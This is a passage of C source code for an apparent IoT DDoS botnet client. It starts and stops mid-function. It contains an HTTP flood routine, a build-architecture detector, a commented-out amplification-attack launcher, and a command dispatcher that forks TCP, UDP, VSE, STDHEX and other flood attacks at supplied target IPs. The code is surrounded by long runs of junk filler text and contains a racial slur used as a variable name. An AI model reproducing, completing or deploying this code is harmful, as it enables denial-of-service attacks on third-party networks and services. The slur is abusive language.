EFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                    read(socket, buffer, 1);//GFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                    close(socket);//GFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                }
            }
           exit(0);
       }
    }
}
void SendKILLOVH(char *host, in_port_t port, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1], pgetData[2048];
    sprintf(pgetData, "\x00","\x01","\x02",
    "\x03","\x04","\x05","\x06","\x07","\x08","\x09",
    "\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10",//random sting decision// 
    "\x11","\x12","\x13","\x14","\x15","\x16","\x17",//random sting decision//
    "\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e",//random sting decision//
    "\x1f","\x20","\x21","\x22","\x23","\x24","\x25",//random sting decision//
    "\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c",//random sting decision//
    "\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33",//random sting decision//
    "\x34","\x35","\x36","\x37","\x38","\x39","\x3a",//random sting decision//
    "\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41",//random sting decision//
    "\x42","\x43","\x44","\x45","\x46","\x47","\x48",//random sting decision//
    "\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f",//random sting decision//
    "\x50","\x51","\x52","\x53","\x54","\x55","\x56",//random sting decision//
    "\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d",//random sting decision//
    "\x5e","\x5f","\x60","\x61","\x62","\x63","\x64",//random sting decision//
    "\x65","\x66","\x67","\x68","\x69","\x6a","\x6b",//random sting decision//
    "\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72",//random sting decision//
    "\x73","\x74","\x75","\x76","\x77","\x78","\x79",//random sting decision//
    "\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80",//random sting decision//
    "\x81","\x82","\x83","\x84","\x85","\x86","\x87",//random sting decision//
    "\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e",//random sting decision//
    "\x8f","\x90","\x91","\x92","\x93","\x94","\x95",//random sting decision//
    "\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c",//random sting decision//
    "\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3",//random sting decision//
    "\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa",//random sting decision//
    "\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1",//random sting decision//
    "\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8",//random sting decision//
    "\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf",//random sting decision//
    "\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6",//random sting decision//
    "\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd",//random sting decision//
    "\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4",//random sting decision//
    "\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb",//random sting decision//
    "\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2",//random sting decision//
    "\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9",//random sting decision//
    "\xea","\xeb","\xec","\xed","\xee","\xef","\xf0",//random sting decision//
    "\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7",//random sting decision//
    "\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff");// done//
    for (i = 0; i < power; i++) {//extra strings [full on top of the random one incase it gets pacthed for some mad reason]//
        sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents[(rand() % 2)]);//
        if (fork()) {//
            while (end > time(NULL)) {//
                socket = socket_connect(host, port);//
                if (socket != 0) {//
                    write(socket, request, strlen(request));//
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
           exit(0);
       }
    }
}

// Attacks Ends HERE
char *getArch() {
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "Arm4";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "Arm5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "Arm6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "Arm7";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "Mips";
    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "Mipsel";
    #elif defined(__sh__)
    return "Sh4";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "Ppc";
    #elif defined(__sparc__) || defined(__sparc)
    return "spc";
    #elif defined(__m68k__)
    return "M68k";
    #elif defined(__arc__)
    return "Arc";
    #else
    return "Unknown Architecture";
    #endif
}

char *getPortz()
{
        if(access("/usr/bin/python", F_OK) != -1){
        return "22";
        }
        if(access("/usr/bin/python3", F_OK) != -1){
        return "22";
        }
        if(access("/usr/bin/perl", F_OK) != -1){
        return "22";
        }
        if(access("/usr/sbin/telnetd", F_OK) != -1){
        return "22";
        } else {
        return "Unknown Port";
        }
}
/*
void senditbudAMP(char *method, char *ip, char *port, char *time) {
    if(!strcmp(method, "CHARGEN"))
    {
        char space[128];
        snprintf(space, sizeof(space), "cd; ./chargen %s %s chargen.txt 2 -1 %s", ip, port, time);
        system(space);
    }
    if(!strcmp(method, "LDAP"))
    {
        char space[128];
        snprintf(space, sizeof(space), "cd; ./ldap %s %s ldap.txt 2 -1 %s", ip, port, time);
        system(space);
    }
    if(!strcmp(method, "REAPER"))
    {
        char space[128];
        snprintf(space, sizeof(space), "./ldap %s %s ldap.txt 2 -1 %s", ip, port, time);
        system(space);
    }
    if(!strcmp(method, "NTP"))
    {
        char space[128];
        snprintf(space, sizeof(space), "cd; ./ntp %s %s ntp.txt 2 %s", ip, port, time);
        system(space);
    }
    if(!strcmp(method, "SSDP"))
    {
        char space[128];
        snprintf(space, sizeof(space), "cd; ./ssdp %s %s ssdp.txt 2 -1 %s", ip, port, time);
        system(space);
    }
    if(!strcmp(method, "DNS"))
    {
        char space[128];
        snprintf(space, sizeof(space), "cd; ./dns %s %s dns.txt 2 -1 %s", ip, port, time);
        system(space);
    }
    if(!strcmp(method, "TS3"))
    {
        char space[128];
        snprintf(space, sizeof(space), "cd; cd supreme; ./ts3 %s %s ts3.txt 2 -1 %s", ip, port, time);
        system(space);
    }
}*/

void processCmd(int argc, unsigned char *argv[])
{
       if(!strcmp(argv[0], "TCP"))
        {
                if(argc < 6)
                {
                        
                        return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                unsigned char *flags = argv[5];

                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
                int psize = argc > 6 ? atoi(argv[6]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        ftcp(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        ftcp(ip, port, time, spoofed, flags, psize, pollinterval);
                        _exit(0);
                }
        }
 if(!strcmp(argv[0], "UDP"))
    {
      if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 1024 || (argc == 6 && atoi(argv[5]) < 1))
      {
        return;
            }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int packetsize = atoi(argv[4]);
                int pollinterval = (argc == 6 ? atoi(argv[5]) : 10);
        int spoofed = 32;
                if(strstr(ip, ",") != NULL)
        {
          unsigned char *hi = strtok(ip, ",");
          while(hi != NULL)
          {
            if(!listFork())
            {
              SendUDP(hi, port, time, packetsize, pollinterval, spoofed);
              _exit(0);
            }
            hi = strtok(NULL, ",");
          }
                } else {
              if (listFork())
              {
                return;
              }
              SendUDP(ip, port, time, packetsize, pollinterval, spoofed);
              _exit(0);
             }  
        }
/*
        if(!strcmp(argv[0], "AMP"))
        {
                // !* AMP LDAP <IP> <PORT> <TIME>
                if(!strcmp(argv[1], "LDAP"))
                {
                        if(argc != 5)
                        {
                            return;
                        }
                        int ip = argv[2];
                        int port = argv[3];
                        int time = argv[4];
                        senditbudAMP("LDAP", ip, port, time);
                }
                 if(!strcmp(argv[1], "REAPER"))
                {
                        if(argc != 5)
                        {
                            return;
                        }
                        int ip = argv[2];
                        int port = argv[3];
                        int time = argv[4];
                        senditbudAMP("REAPER", ip, port, time);
                }

                if(!strcmp(argv[1], "NTP"))
                {
                        if(argc != 5)
                        {
                            return;
                        }
                        int ip = argv[2];
                        int port = argv[3];
                        int time = argv[4];
                        senditbudAMP("NTP", ip, port, time);
                }
                if(!strcmp(argv[1], "SSDP"))
                {
                        if(argc != 5)
                        {
                            return;
                        }
                        int ip = argv[2];
                        int port = argv[3];
                        int time = argv[4];
                        senditbudAMP("SSDP", ip, port, time);
                }
                if(!strcmp(argv[1], "CHARGEN"))
                {
                        if(argc != 5)
                        {
                            return;
                        }
                        int ip = argv[2];
                        int port = argv[3];
                        int time = argv[4];
                        senditbudAMP("CHARGEN", ip, port, time);
                }
                if(!strcmp(argv[1], "DNS"))
                {
                        if(argc != 5)
                        {
                            return;
                        }
                        int ip = argv[2];
                        int port = argv[3];
                        int time = argv[4];
                        senditbudAMP("DNS", ip, port, time);
                }
                if(!strcmp(argv[1], "TS3"))
                {
                        if(argc != 5)
                        {
                            return;
                        }
                        int ip = argv[2];
                        int port = argv[3];
                        int time = argv[4];
                        senditbudAMP("TS3", ip, port, time);
                }
        }*/
    
    
    if (!strcmp(argv[0], "HTTPSTOMP"))
    {
      if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
      if (listFork()) return;
      SendHTTPHex(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
      sendHTTPtwo(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
      exit(0);
    }

    if(!strcmp(argv[0], "VSE")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
        }

        if(!strcmp(argv[0], "STDHEX"))
      {
    if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
    {
      return;
    }
    unsigned char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if(strstr(ip, ",") != NULL)
    {
      unsigned char *niggas = strtok(ip, ",");
      while(niggas != NULL)
      {
        if(!listFork())
        {
          SendSTDHEX(niggas, port, time);
          _exit(0);
        }
        niggas = strtok(NULL, ",");
      }
    } else {
      if (listFork()) { return; }
      SendSTDHEX(ip, port, time);
      _exit(0);
    }
  } ////

        if(!strcmp(argv[0], "KTN"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendKTN(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendKTN(ip, port, time);
            _exit(0);
        }
    }   



            if(!strcmp(argv[0], "100UP"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    Send100UP(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            Send100UP(ip, port, time);
            _exit(0);
        }
    }   ////

            if(!strcmp(argv[0], "ZAP"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendZAP(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendZAP(ip, port, time);
            _exit(0);
        }
    }   ////

            if(!strcmp(argv[0], "CNN"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendCNN(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendCNN(ip, port, time);
            _exit(0);
        }
    }   ////

            if(!strcmp(argv[0], "DEATH"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendDEATH(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendDEATH(ip, port, time);
            _exit(0);
        }
    }   ////

            if(!strcmp(argv[0], "NUKE"))
        {
